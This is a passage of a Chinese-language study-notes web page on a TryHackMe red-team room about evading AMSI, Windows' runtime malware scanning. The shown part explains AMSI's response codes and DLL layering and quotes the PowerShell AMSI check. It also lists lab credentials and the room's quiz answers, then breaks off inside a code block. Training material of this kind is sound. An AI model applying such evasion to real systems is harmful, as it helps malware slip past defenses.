<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Runtime Detection Evasion - 运行时检测规避 | PgDn&#x27;s Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://pgup-code.github.io/PgUp-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://pgup-code.github.io/PgUp-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Runtime Detection Evasion - 运行时检测规避 | PgDn&#x27;s Notes"><meta data-rh="true" name="description" content="学习如何使用现代的工具无关方法绕过常见的运行时检测措施，例如 AMSI。"><meta data-rh="true" property="og:description" content="学习如何使用现代的工具无关方法绕过常见的运行时检测措施，例如 AMSI。"><link data-rh="true" rel="icon" href="/PgUp-code.github.io/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避" hreflang="en"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/PgUp-code.github.io/blog/rss.xml" title="PgDn&#39;s Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/PgUp-code.github.io/blog/atom.xml" title="PgDn&#39;s Notes Atom Feed"><link rel="stylesheet" href="/PgUp-code.github.io/assets/css/styles.ebd0f903.css">
<script src="/PgUp-code.github.io/assets/js/runtime~main.005fc784.js" defer="defer"></script>
<script src="/PgUp-code.github.io/assets/js/main.770912a1.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/PgUp-code.github.io/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/PgUp-code.github.io/"><div class="navbar__logo"><img src="/PgUp-code.github.io/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/PgUp-code.github.io/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">PgDn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/PgUp-code.github.io/docs/category/red-teaming---红队">TryHackMe</a><a class="navbar__item navbar__link" href="/PgUp-code.github.io/docs/category/docusaurus-备忘录">备忘录</a><a class="navbar__item navbar__link" href="/PgUp-code.github.io/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/PgUp-code/PgUp-code.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/PgUp-code.github.io/docs/category/red-teaming---红队">Red Teaming - 红队</a><button aria-label="Collapse sidebar category &#x27;Red Teaming - 红队&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/PgUp-code.github.io/docs/category/host-evasions---主机规避">Host Evasions - 主机规避</a><button aria-label="Collapse sidebar category &#x27;Host Evasions - 主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Windows Internals - Windows 内部原理">Windows Internals - Windows 内部原理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介">Introduction to Windows API - Windows API简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制">Abusing Windows Internals - 滥用 Windows 内部机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介">Introduction to Antivirus - 防病毒简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode">AV Evasion Shellcode - AV 绕过：Shellcode</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则">Obfuscation Principles - 混淆原则</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避">Signature Evasion - 签名规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC">Bypassing UAC - 绕过 UAC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避">Runtime Detection Evasion - 运行时检测规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控">Evading Logging and Monitoring - 绕过日志记录和监控</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具">Living Off the Land - 利用现成工具</a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/PgUp-code.github.io/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/PgUp-code.github.io/docs/category/red-teaming---红队"><span itemprop="name">Red Teaming - 红队</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/PgUp-code.github.io/docs/category/host-evasions---主机规避"><span itemprop="name">Host Evasions - 主机规避</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Runtime Detection Evasion - 运行时检测规避</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Runtime Detection Evasion - 运行时检测规避</h1></header><blockquote>
<p>学习如何使用现代的工具无关方法绕过常见的运行时检测措施，例如 AMSI。</p>
<p><a href="https://tryhackme.com/room/runtimedetectionevasion" target="_blank" rel="noopener noreferrer">TryHackMe | Runtime Detection Evasion</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction---简介">Introduction - 简介<a href="#introduction---简介" class="hash-link" aria-label="Direct link to Introduction - 简介" title="Direct link to Introduction - 简介">​</a></h2>
<p>随着 PowerShell 版本低于 3 的发布，微软推出了 AMSI（反恶意软件扫描接口），这是一种旨在阻止和监控持续威胁的运行时监控解决方案。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="Direct link to 学习目标" title="Direct link to 学习目标">​</a></h3>
<ul>
<li>理解运行时检测的目的及其实现方式。</li>
<li>学习并应用绕过 AMSI 的技术。</li>
<li>了解常见的缓解措施及其可能的替代方法。</li>
</ul>
<p>运行时检测措施在执行恶意代码时可能带来诸多阻碍和难题。幸运的是，作为攻击者，我们可以利用多种技术和方法来绕过常见的运行时检测解决方案。</p>
<p>本教程将引用多位作者和研究人员的研究成果，所有功劳归属于各自的原创者。</p>
<p>在开始本教程之前，请熟悉操作系统的整体架构。建议具备 C# 和 PowerShell 的基础编程知识，但并非必需。</p>
<p>我们已提供一台预装了完成本教程所需文件的基础 Windows 机器。您可以在浏览器中访问该机器，或使用以下凭据通过 RDP 连接：</p>
<p>机器 IP：<code>MACHINE_IP</code>
用户名：<code>THM-Attacker</code>
密码：<code>Tryhackme!</code></p>
<p>接下来将涉及大量信息，请系好安全带，并确认最近的灭火器位置。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="runtime-detections---运行时检测">Runtime Detections - 运行时检测<a href="#runtime-detections---运行时检测" class="hash-link" aria-label="Direct link to Runtime Detections - 运行时检测" title="Direct link to Runtime Detections - 运行时检测">​</a></h2>
<p>在执行代码或应用程序时，无论使用何种解释器，几乎都会经过一个运行时环境。这在使用 Windows API 调用和与 .NET 交互时最为常见。<a href="https://docs.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="noopener noreferrer">CLR（<strong>C</strong>ommon <strong>L</strong>anguage <strong>R</strong>untime，公共语言运行时）</a>和<a href="https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview" target="_blank" rel="noopener noreferrer">DLR（<strong>D</strong>ynamic <strong>L</strong>anguage <strong>R</strong>untime，动态语言运行时）</a>是 .NET 的运行时环境，是在 Windows 系统中最常遇到的运行时环境。</p>
<p>在本任务中，我们不会深入探讨运行时的具体机制，而是专注于它们的监控方式以及恶意代码的检测方法。</p>
<p>运行时检测措施会在代码进入运行时之前对其进行扫描，并判断是否为恶意代码。根据具体的检测机制和技术，此检测可能基于字符串特征、启发式分析或行为分析。如果代码被怀疑为恶意代码，它将被赋予一个数值，若该数值在指定范围内，则可能会终止执行，甚至隔离或删除该文件/代码。</p>
<p>运行时检测措施不同于传统的杀毒软件，前者会直接从内存和运行时环境中进行扫描。同时，杀毒软件产品也可能采用这些运行时检测机制，以便更深入地分析代码中发起的调用和钩子。在某些情况下，杀毒软件产品可能将运行时检测流/数据作为其启发式分析的一部分。</p>
<p>本教程将主要聚焦于 <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" target="_blank" rel="noopener noreferrer">AMSI（<strong>A</strong>nti-<strong>M</strong>alware <strong>S</strong>can <strong>I</strong>nterface，反恶意软件扫描接口）</a>。AMSI 是 Windows 原生自带的运行时检测机制，作为一个接口供其他产品和解决方案使用。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>Windows 原生自带的运行时检测机制是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">AMSI</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="amsi-概述">AMSI 概述<a href="#amsi-概述" class="hash-link" aria-label="Direct link to AMSI 概述" title="Direct link to AMSI 概述">​</a></h2>
<p>AMSI（<strong>A</strong>nti-<strong>M</strong>alware <strong>S</strong>can <strong>I</strong>nterface，反恶意软件扫描接口）是一种 PowerShell 安全功能，允许任何应用程序或服务直接集成到反恶意软件产品中。Defender 利用 AMSI 在 .NET 运行时内对有效载荷和脚本在执行前进行扫描。</p>
<p>微软表示：“Windows 反恶意软件扫描接口 (AMSI) 是一种通用接口标准，允许您的应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI 可为终端用户及其数据、应用程序和工作负载提供增强的恶意软件防护。”</p>
<p>关于 AMSI 的更多信息，请参阅 <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/" target="_blank" rel="noopener noreferrer">Windows 文档</a>。</p>
<p>AMSI 会根据扫描结果的响应代码决定其行为。以下是可能的响应代码列表：</p>
<ul>
<li><code>AMSI_RESULT_CLEAN = 0</code></li>
<li><code>AMSI_RESULT_NOT_DETECTED = 1</code></li>
<li><code>AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384</code></li>
<li><code>AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479</code></li>
<li><code>AMSI_RESULT_DETECTED = 32768</code></li>
</ul>
<p>这些响应代码仅在 AMSI 的后台或通过第三方实现中报告。如果 AMSI 检测到恶意结果，它将终止执行并发送以下错误消息：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:Users\Tryhackme&gt; &#x27;Invoke-Hacks&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">At line:1 char:1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+ &quot;Invoke-Hacks&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+ ~~~~~~~~~~~~~~</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This script contains malicious content and has been blocked by your antivirus software.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        + CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>AMSI 已完全集成到以下 Windows 组件中：</p>
<ul>
<li>用户帐户控制 (UAC)</li>
<li>PowerShell</li>
<li>Windows Script Host（wscript 和 cscript）</li>
<li>JavaScript 和 VBScript</li>
<li>Office VBA 宏</li>
</ul>
<p>作为攻击者，在针对上述组件时，我们需要留意 AMSI 及其在执行代码或利用组件时的具体实现。</p>
<p>在下一个任务中，我们将介绍 AMSI 在 Windows 中的工作原理及其实现的技术细节。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>32768 对应的响应值是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">AMSI_RESULT_DETECTED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="amsi-的实现机制">AMSI 的实现机制<a href="#amsi-的实现机制" class="hash-link" aria-label="Direct link to AMSI 的实现机制" title="Direct link to AMSI 的实现机制">​</a></h2>
<p>AMSI 的实现机制较为复杂，涉及多个 DLL 以及根据其部署位置而变化的执行策略。从定义上讲，AMSI 仅是其他反恶意软件产品的一个接口；AMSI 会根据正在执行的内容及其所在层次，调用多个提供程序 DLL 和 API。</p>
<p>AMSI 的实现来源于 <code>System.Management.Automation.dll</code>，这是 Windows 开发的一个 .NET 程序集。根据微软文档的描述：“程序集是 .NET 应用程序在部署、版本控制、重用、激活范围和安全权限方面的基本单位。”</p>
<p>该 .NET 程序集会根据解释器以及代码位于磁盘或内存中，来调用其他 DLL 和 API。下图展示了数据在各层次中如何被解构以及对应的 DLL/API 调用。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/PgUp-code.github.io/assets/images/35e16d45ce27145fcdf231fdb8dcb35e-bcfbb1b154fff2c01cf14042a8f6ae02.png" width="936" height="521" class="img_ev3q"></p>
<p>在上面的图示中，数据的流动将取决于所使用的解释器（PowerShell/VBScript 等）。随着数据在模型中的每一层流动，各种 API 调用和接口会被逐步实现。理解 AMSI 的完整模型非常重要，但我们可以将其拆解为核心组件，如下图所示。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/PgUp-code.github.io/assets/images/efca9438e858f0476a4ffd777c36501a-2ebd14a1176e1dab9e6815555fc7f877.png" width="981" height="181" class="img_ev3q"></p>
<p>注意：AMSI 仅在从内存加载并通过 CLR 执行时才会被实现。如果代码位于磁盘上，则假设已经在执行过程中由 MsMpEng.exe（Windows Defender）实现。</p>
<p>我们的大部分研究和已知的绕过方法都集中在 Win32 API 层，操作 <a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer" target="_blank" rel="noopener noreferrer">AmsiScanBuffer</a> API 调用上。</p>
<p>你还可能注意到 AMSI 的“其他应用程序”接口。像杀毒软件供应商这样的第三方可以从他们的产品中实现 AMSI。微软文档中有 <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions" target="_blank" rel="noopener noreferrer">AMSI 函数</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream" target="_blank" rel="noopener noreferrer">AMSI 流接口</a>。</p>
<hr>
<p>我们可以通过分解 AMSI PowerShell 实现的代码，更好地理解其实现方式以及如何检查可疑内容。为了找出 AMSI 被实现的位置，我们可以使用由 <a href="https://github.com/cobbr" target="_blank" rel="noopener noreferrer">Cobbr</a> 维护的 <a href="https://github.com/PowerShell/PowerShell/compare/master...cobbr:master" target="_blank" rel="noopener noreferrer">InsecurePowerShell</a>。InsecurePowerShell 是 PowerShell 的一个 GitHub 分支，已移除安全功能；这意味着我们可以查看比较的提交并观察任何安全特性。AMSI 仅在 <code>src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</code> 中的十二行代码中实现。以下是这十二行代码：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">var scriptExtent </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> scriptBlockAst</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Extent</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">AmsiUtils</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ScanContent</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">scriptExtent</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Text</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> scriptExtent</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">File</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> AmsiUtils</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AmsiNativeMethods</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AMSI_RESULT</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AMSI_RESULT_DETECTED</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  var parseError </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span 